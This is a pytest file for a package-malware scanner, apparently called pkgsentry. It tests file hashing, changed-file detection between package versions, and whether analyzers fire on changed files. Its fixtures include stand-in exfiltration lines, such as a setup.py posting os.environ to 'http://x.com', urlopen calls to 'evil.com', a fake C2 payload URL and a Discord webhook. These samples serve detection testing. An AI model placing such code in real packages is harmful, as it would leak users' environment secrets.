# SPDX-License-Identifier: AGPL-3.0-or-later
"""Tests for per-file SHA256 code-diff scanning."""
from __future__ import annotations

from pathlib import Path

from pkgsentry.analyze.imports import analyze_imports
from pkgsentry.analyze.iocs import analyze_iocs
from pkgsentry.analyze.malware_patterns import analyze_malware_patterns


# ---------------------------------------------------------------------------
# Helper: write files into a temp tree
# ---------------------------------------------------------------------------

def _write(root: Path, files: dict[str, bytes]) -> None:
    for name, data in files.items():
        p = root / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)


# ---------------------------------------------------------------------------
# _compute_file_hashes
# ---------------------------------------------------------------------------

def test_compute_hashes_sdist_strips_toplevel(tmp_path):
    from pkgsentry.pipeline import _compute_file_hashes

    _write(tmp_path, {
        "pkg-1.0.0/setup.py": b"print(1)",
        "pkg-1.0.0/pkg/__init__.py": b"",
        "pkg-1.0.0/pkg/utils.py": b"x = 1",
    })
    hashes, norm_to_real = _compute_file_hashes(tmp_path, "sdist")
    assert "setup.py" in hashes
    assert "pkg/__init__.py" in hashes
    assert "pkg/utils.py" in hashes
    assert norm_to_real["setup.py"] == "pkg-1.0.0/setup.py"


def test_compute_hashes_wheel_no_strip(tmp_path):
    from pkgsentry.pipeline import _compute_file_hashes

    _write(tmp_path, {
        "pkg/__init__.py": b"",
        "pkg/core.py": b"x = 1",
    })
    hashes, norm_to_real = _compute_file_hashes(tmp_path, "wheel")
    assert "pkg/__init__.py" in hashes
    assert "pkg/core.py" in hashes
    assert norm_to_real["pkg/__init__.py"] == "pkg/__init__.py"


def test_compute_hashes_deterministic(tmp_path):
    from pkgsentry.pipeline import _compute_file_hashes

    _write(tmp_path, {"pkg-1.0/a.py": b"hello"})
    h1, _ = _compute_file_hashes(tmp_path, "sdist")
    h2, _ = _compute_file_hashes(tmp_path, "sdist")
    assert h1 == h2


def test_compute_hashes_large_file_sha_only(tmp_path, monkeypatch):
    """A file above the size cap (big native binary) gets a streamed SHA-256 but
    skips the expensive entropy/ssdeep/TLSH metrics — and the SHA matches the
    non-streamed value."""
    import hashlib
    import pkgsentry.pipeline as pl

    monkeypatch.setattr(pl, "HASH_FULL_MAX_BYTES", 1024)
    blob = b"\x00\xff" * 4096  # 8 KB, > cap
    _write(tmp_path, {"big.node": blob})
    hashes, _ = pl._compute_file_hashes(tmp_path, "wheel")
    fi = hashes["big.node"]
    assert fi.sha256 == hashlib.sha256(blob).hexdigest()  # streamed == whole-file
    assert fi.entropy == 0.0 and fi.ssdeep == "" and fi.tlsh == ""


def test_compute_hashes_small_file_full_metrics(tmp_path, monkeypatch):
    import pkgsentry.pipeline as pl
    monkeypatch.setattr(pl, "HASH_FULL_MAX_BYTES", 1024 * 1024)
    _write(tmp_path, {"a.py": b"x" * 512})
    hashes, _ = pl._compute_file_hashes(tmp_path, "wheel")
    # under cap -> sha present (entropy may be ~0 for uniform data, but the
    # metric path ran; just assert it didn't take the sha-only branch shape)
    assert hashes["a.py"].sha256


# ---------------------------------------------------------------------------
# _find_changed_files
# ---------------------------------------------------------------------------

def _fi(sha: str, entropy: float = 0.0, ssdeep: str = "") -> "FileInfo":
    from pkgsentry.pipeline import FileInfo
    return FileInfo(sha256=sha, entropy=entropy, ssdeep=ssdeep)


def test_find_changed_new_file():
    from pkgsentry.pipeline import _find_changed_files

    current = {"a.py": _fi("aaa"), "b.py": _fi("bbb")}
    prev = {"a.py": _fi("aaa")}
    norm_to_real = {"a.py": "pkg-2.0/a.py", "b.py": "pkg-2.0/b.py"}
    changed = _find_changed_files(current, prev, norm_to_real)
    assert changed == {"pkg-2.0/b.py"}


def test_find_changed_modified_file():
    from pkgsentry.pipeline import _find_changed_files

    current = {"a.py": _fi("new_hash")}
    prev = {"a.py": _fi("old_hash")}
    norm_to_real = {"a.py": "pkg-2.0/a.py"}
    changed = _find_changed_files(current, prev, norm_to_real)
    assert changed == {"pkg-2.0/a.py"}


def test_find_changed_no_changes():
    from pkgsentry.pipeline import _find_changed_files

    current = {"a.py": _fi("same"), "b.py": _fi("same2")}
    prev = {"a.py": _fi("same"), "b.py": _fi("same2")}
    norm_to_real = {"a.py": "pkg/a.py", "b.py": "pkg/b.py"}
    changed = _find_changed_files(current, prev, norm_to_real)
    assert changed == set()


def test_find_changed_all_new_first_version():
    from pkgsentry.pipeline import _find_changed_files, FileInfo

    current = {"a.py": _fi("aaa"), "b.py": _fi("bbb")}
    prev: dict[str, FileInfo] = {}
    norm_to_real = {"a.py": "pkg/a.py", "b.py": "pkg/b.py"}
    changed = _find_changed_files(current, prev, norm_to_real)
    assert changed == {"pkg/a.py", "pkg/b.py"}


# ---------------------------------------------------------------------------
# Analyzer filtering: changed_files=None → full scan
# ---------------------------------------------------------------------------

def test_imports_full_scan_when_no_changed_files(tmp_path):
    _write(tmp_path, {
        "pkg/__init__.py": b"import urllib.request; urllib.request.urlopen('http://evil.com')",
    })
    findings = analyze_imports(tmp_path, changed_files=None)
    assert len(findings) > 0


def test_iocs_full_scan_when_no_changed_files(tmp_path):
    _write(tmp_path, {
        "pkg/config.py": b"url = 'http://attacker-c2.xyz/payload'",
    })
    findings = analyze_iocs(tmp_path, changed_files=None)
    assert len(findings) > 0


def test_malware_full_scan_when_no_changed_files(tmp_path):
    _write(tmp_path, {
        "setup.py": b"import os; data = os.environ; import requests; requests.post('http://x.com', data=data)",
    })
    findings = analyze_malware_patterns(tmp_path, changed_files=None)
    assert len(findings) > 0


# ---------------------------------------------------------------------------
# Analyzer filtering: changed_files skips unchanged files
# ---------------------------------------------------------------------------

def test_imports_skips_unchanged(tmp_path):
    _write(tmp_path, {
        "pkg/__init__.py": b"import urllib.request; urllib.request.urlopen('http://evil.com')",
    })
    findings = analyze_imports(tmp_path, changed_files={"other/file.py"})
    assert findings == []


def test_iocs_skips_unchanged(tmp_path):
    _write(tmp_path, {
        "pkg/config.py": b"url = 'http://attacker-c2.xyz/payload'",
    })
    findings = analyze_iocs(tmp_path, changed_files={"other/file.py"})
    assert findings == []


def test_malware_skips_unchanged(tmp_path):
    _write(tmp_path, {
        "setup.py": b"https://discord.com/api/webhooks/123456/abcdef",
    })
    findings = analyze_malware_patterns(tmp_path, changed_files={"other.py"})
    assert findings == []


# ---------------------------------------------------------------------------
# Analyzer filtering: changed_files includes the target file → fires
# ---------------------------------------------------------------------------

def test_imports_scans_changed_file(tmp_path):
    _write(tmp_path, {
        "pkg/__init__.py": b"import urllib.request; urllib.request.urlopen('http://evil.com')",
    })
    findings = analyze_imports(tmp_path, changed_files={"pkg/__init__.py"})
    assert len(findings) > 0


def test_iocs_scans_changed_file(tmp_path):
    _write(tmp_path, {
        "pkg/config.py": b"url = 'http://attacker-c2.xyz/payload'",
    })
    findings = analyze_iocs(tmp_path, changed_files={"pkg/config.py"})
    assert len(findings) > 0


def test_malware_scans_changed_file(tmp_path):
    _write(tmp_path, {
        "setup.py": b"https://discord.com/api/webhooks/123456/abcdef",
    })
    findings = analyze_malware_patterns(tmp_path, changed_files={"setup.py"})
    assert any(f.rule_id == "malware.discord_webhook" for f in findings)


# ---------------------------------------------------------------------------
# Cross-version hash comparison (sdist normalization)
# ---------------------------------------------------------------------------

def test_cross_version_sdist_diff(tmp_path):
    """Same file content across versions → no changes; modified → detected."""
    from pkgsentry.pipeline import _compute_file_hashes, _find_changed_files

    v1 = tmp_path / "v1"
    _write(v1, {
        "pkg-1.0.0/setup.py": b"print('hello')",
        "pkg-1.0.0/pkg/__init__.py": b"x = 1",
    })
    v1_hashes, _ = _compute_file_hashes(v1, "sdist")

    v2 = tmp_path / "v2"
    _write(v2, {
        "pkg-1.0.1/setup.py": b"print('hello')",
        "pkg-1.0.1/pkg/__init__.py": b"x = 2",  # changed
    })
    v2_hashes, v2_norm = _compute_file_hashes(v2, "sdist")

    changed = _find_changed_files(v2_hashes, v1_hashes, v2_norm)
    assert "pkg-1.0.1/pkg/__init__.py" in changed
    assert "pkg-1.0.1/setup.py" not in changed
